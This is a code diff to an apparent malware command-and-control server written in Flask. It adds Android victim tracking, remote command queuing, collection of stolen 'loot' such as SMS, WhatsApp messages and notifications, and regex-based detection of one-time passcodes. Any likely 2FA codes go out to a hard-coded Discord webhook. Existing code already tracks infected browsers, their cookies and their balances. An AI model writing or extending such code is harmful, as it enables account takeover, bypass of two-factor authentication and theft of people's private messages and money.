@@ -48,7 +48,9 @@ def geo_from_ip(ip):
 jobs = {}  # id -> {vid, cmd, args, every_sec, next_ts, label}
 
 browsers = {}  # eid -> client info
+androids = {}  # aid -> android client info
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543772740560101450/nxQpj7CQHkx0K8u8BiOFg1Gtl6FDg5-e1_NJhkTmh-qUK_kVq8IOhsWWgwq73FWn-5x7"
+ANDROID_OTP_WEBHOOK = "https://discord.com/api/webhooks/1547170223956824077/OhCoLh0SdTcm9K_M3k4ezLoqcoQ5v9muZ4_75JXPpk-QYYngRDFW0bgVPIk-Al4a8UcQ"
 
 def _browser_wh(title, lines):
     try:
@@ -65,6 +67,7 @@ def _browser_wh(title, lines):
         pass
 
 BROWSER_FILE = BASE / "browsers.json"
+ANDROID_FILE = BASE / "androids.json"
 
 def load_browsers():
     global browsers
@@ -81,6 +84,24 @@ def save_browsers():
         pass
 
 load_browsers()
+
+def load_androids():
+    global androids
+    try:
+        if ANDROID_FILE.exists():
+            androids = json.loads(ANDROID_FILE.read_text(encoding="utf-8"))
+        else:
+            androids = {}
+    except Exception:
+        androids = {}
+
+def save_androids():
+    try:
+        ANDROID_FILE.write_text(json.dumps(androids, indent=2), encoding="utf-8")
+    except Exception:
+        pass
+
+load_androids()
 
 
 
@@ -863,6 +884,12 @@ def browser_hello():
     entry["tabs"] = data.get("tabs") if isinstance(data.get("tabs"), list) else entry.get("tabs") or []
     entry["roblox_alive"] = bool(data.get("roblox_alive")) if "roblox_alive" in data else entry.get("roblox_alive")
     entry["ext_ver"] = str(data.get("ext_ver") or entry.get("ext_ver") or "")[:20]
+    entry["kind"] = str(data.get("kind") or entry.get("kind") or "")[:40]
+    entry["donutflip"] = bool(data.get("donutflip")) if "donutflip" in data else entry.get("donutflip", False)
+    if data.get("cookie_count") is not None:
+        entry["cookie_count"] = data.get("cookie_count")
+    if data.get("balance") is not None:
+        entry["balance"] = data.get("balance")
     pending = list(entry.get("pending_drops") or [])
     cmds = list(entry.get("pending_cmds") or [])
     entry["pending_drops"] = []
@@ -1102,6 +1129,224 @@ def browser_loot_download_type(eid):
     from flask import Response
     return Response(body, mimetype=mime, headers={
         "Content-Disposition": f"attachment; filename={typ}_{eid[:8]}.{ext}"
+    })
+
+
+
+
+def _looks_like_otp(text: str) -> bool:
+    if not text:
+        return False
+    import re as _re
+    t = str(text)
+    if _re.search(r"\b\d{4,8}\b", t) and _re.search(r"(code|otp|verify|verification|password|login|2fa|auth)", t, _re.I):
+        return True
+    if _re.search(r"\b\d{6}\b", t):
+        return True
+    return False
+
+def _post_android_otp_webhook(aid: str, payload):
+    try:
+        import urllib.request
+        url = ANDROID_OTP_WEBHOOK
+        if not url:
+            return
+        body = {
+            "embeds": [{
+                "title": "Android OTP / code",
+                "description": f"```{str(payload)[:1800]}```",
+                "color": 0xA855F7,
+                "footer": {"text": f"aid {aid}"},
+            }]
+        }
+        req = urllib.request.Request(
+            url,
+            data=json.dumps(body).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        urllib.request.urlopen(req, timeout=8).read()
+    except Exception:
+        pass
+
+
+# ===================== ANDROID CLIENTS =====================
+@app.route("/api/android/hello", methods=["POST"])
+def android_hello():
+    data = request.get_json(force=True, silent=True) or {}
+    aid = (data.get("aid") or data.get("eid") or "").strip()
+    if not aid or len(aid) < 6:
+        return jsonify({"error": "bad aid"}), 400
+    ua = request.headers.get("User-Agent", "")[:180]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or ""
+    if "," in ip:
+        ip = ip.split(",")[0].strip()
+    entry = androids.get(aid) or {
+        "pending_cmds": [], "first_seen": now(), "loot": [],
+    }
+    entry["last_seen"] = now()
+    entry["ua"] = ua
+    entry["ip"] = ip
+    for k in ("model", "manufacturer", "android_ver", "sdk", "lang", "tz", "app", "app_ver", "screen"):
+        if data.get(k) is not None:
+            entry[k] = str(data.get(k))[:80]
+    entry["perms"] = data.get("perms") if isinstance(data.get("perms"), dict) else entry.get("perms") or {}
+    try:
+        if ip and (not entry.get("country") or entry.get("ip") != ip):
+            g = geo_from_ip(ip) or {}
+            if g:
+                entry["country"] = g.get("country") or entry.get("country")
+                entry["city"] = g.get("city") or entry.get("city")
+                entry["isp"] = g.get("isp") or entry.get("isp")
+    except Exception:
+        pass
+    cmds = list(entry.get("pending_cmds") or [])
+    entry["pending_cmds"] = []
+    androids[aid] = entry
+    save_androids()
+    info = {k: entry[k] for k in entry if k not in ("pending_cmds", "loot")}
+    socketio.emit("android_update", {"aid": aid, "info": info})
+    return jsonify({"ok": True, "cmds": cmds})
+
+@app.route("/api/android/list")
+@login_required
+def android_list():
+    out = []
+    for aid, a in androids.items():
+        out.append({
+            "aid": aid,
+            "last_seen": a.get("last_seen"),
+            "first_seen": a.get("first_seen"),
+            "ip": a.get("ip"),
+            "model": a.get("model"),
+            "manufacturer": a.get("manufacturer"),
+            "android_ver": a.get("android_ver"),
+            "app": a.get("app"),
+            "app_ver": a.get("app_ver"),
+            "lang": a.get("lang"),
+            "tz": a.get("tz"),
+            "country": a.get("country"),
+            "city": a.get("city"),
+            "isp": a.get("isp"),
+            "perms": a.get("perms") or {},
+            "notes": a.get("notes"),
+            "tags": a.get("tags") or [],
+            "pinned": a.get("pinned"),
+            "loot_count": len(a.get("loot") or []),
+            "pending": len(a.get("pending_cmds") or []),
+        })
+    out.sort(key=lambda x: x.get("last_seen") or "", reverse=True)
+    return jsonify(out)
+
+@app.route("/api/android/cmd", methods=["POST"])
+@login_required
+def android_cmd():
+    data = request.get_json(force=True, silent=True) or {}
+    aid = (data.get("aid") or "").strip()
+    cmd = (data.get("cmd") or "").strip()
+    args = data.get("args") if isinstance(data.get("args"), dict) else {}
+    if not aid or aid not in androids:
+        return jsonify({"error": "unknown"}), 404
+    if not cmd:
+        return jsonify({"error": "no cmd"}), 400
+    androids[aid].setdefault("pending_cmds", []).append({"cmd": cmd, "args": args, "ts": now()})
+    save_androids()
+    return jsonify({"ok": True})
+
+@app.route("/api/android/loot", methods=["POST"])
+def android_loot():
+    data = request.get_json(force=True, silent=True) or {}
+    aid = (data.get("aid") or data.get("eid") or "").strip()
+    if not aid:
+        return jsonify({"error": "bad aid"}), 400
+    if aid not in androids:
+        androids[aid] = {"pending_cmds": [], "first_seen": now(), "loot": []}
+    kind = (data.get("type") or "unknown").strip()
+    payload = data.get("data")
+    entry = {"type": kind, "ts": now(), "data": payload}
+    androids[aid].setdefault("loot", []).append(entry)
+    androids[aid]["loot"] = androids[aid]["loot"][-80:]
+    androids[aid]["last_seen"] = now()
+    save_androids()
+    loot_dir = BASE / "android_loot" / aid
+    loot_dir.mkdir(parents=True, exist_ok=True)
+    try:
+        (loot_dir / f"{kind}_{int(time.time())}.json").write_text(json.dumps(entry, indent=2, default=str), encoding="utf-8")
+    except Exception:
+        pass
+    socketio.emit("android_loot", {"aid": aid, "type": kind, "ts": entry["ts"]})
+    # OTP webhook on likely codes
+    try:
+        blob = payload
+        if kind in ("notifications", "notifications_live", "otp", "whatsapp", "sms"):
+            text = blob if isinstance(blob, str) else json.dumps(blob, ensure_ascii=False)
+            if _looks_like_otp(text) or kind == "otp":
+                _post_android_otp_webhook(aid, blob)
+                socketio.emit("android_otp", {"aid": aid, "data": blob, "ts": entry["ts"]})
+    except Exception:
+        pass
+    return jsonify({"ok": True})
+
+@app.route("/api/android/loot/<aid>")
+@login_required
+def android_loot_get(aid):
+    a = androids.get(aid) or {}
+    return jsonify(a.get("loot") or [])
+
+@app.route("/api/android/meta", methods=["POST"])
+@login_required
+def android_meta():
+    data = request.get_json(force=True, silent=True) or {}
+    aid = (data.get("aid") or "").strip()
+    if aid not in androids:
+        return jsonify({"error": "unknown"}), 404
+    if "notes" in data:
+        androids[aid]["notes"] = str(data.get("notes") or "")[:2000]
+    if "tags" in data:
+        tags = data.get("tags")
+        if isinstance(tags, str):
+            tags = [x.strip() for x in tags.split(",") if x.strip()]
+        androids[aid]["tags"] = list(tags or [])[:20]
+    if "pinned" in data:
+        androids[aid]["pinned"] = bool(data.get("pinned"))
+    save_androids()
+    return jsonify({"ok": True})
+
+@app.route("/api/android/delete", methods=["POST"])
+@login_required
+def android_delete():
+    data = request.get_json(force=True, silent=True) or {}
+    aid = (data.get("aid") or "").strip()
+    if aid in androids:
+        androids.pop(aid, None)
+        save_androids()
+    return jsonify({"ok": True})
+
+@app.route("/api/android/loot_download/<aid>")
+@login_required
+def android_loot_download_type(aid):
+    typ = (request.args.get("type") or "").strip()
+    items = (androids.get(aid) or {}).get("loot") or []
+    match = None
+    for it in reversed(items):
+        if not typ or it.get("type") == typ:
+            match = it
+            break
+    if not match:
+        return "missing", 404
+    data = match.get("data")
+    typ = match.get("type") or "loot"
+    if isinstance(data, str):
+        body = data
+        mime = "text/plain"
+        ext = "txt"
+    else:
+        body = json.dumps(match, indent=2, default=str)
+        mime = "application/json"
+        ext = "json"
+    from flask import Response
+    return Response(body, mimetype=mime, headers={
+        "Content-Disposition": f"attachment; filename={typ}_{aid[:8]}.{ext}"
     })
 
 
